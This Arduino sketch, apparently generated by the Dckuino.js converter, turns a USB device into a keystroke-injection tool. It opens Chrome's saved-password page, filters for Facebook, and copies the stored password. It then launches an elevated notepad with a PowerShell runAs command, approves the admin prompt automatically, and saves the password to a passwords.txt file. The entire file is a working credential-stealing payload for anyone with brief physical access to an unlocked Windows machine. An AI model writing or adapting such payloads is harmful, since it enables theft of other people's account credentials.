/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(400);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("chrome.exe");

  delay(400);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("chrome://settings/passwords");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("facebook");

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell start-process notepad.exe -Verb runAs");

  delay(500);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("s");

  delay(500);

  Keyboard.print("passwords.txt");

  delay(500);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  Keyboard.print("c");

  delay(1000);

  Keyboard.print("l");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
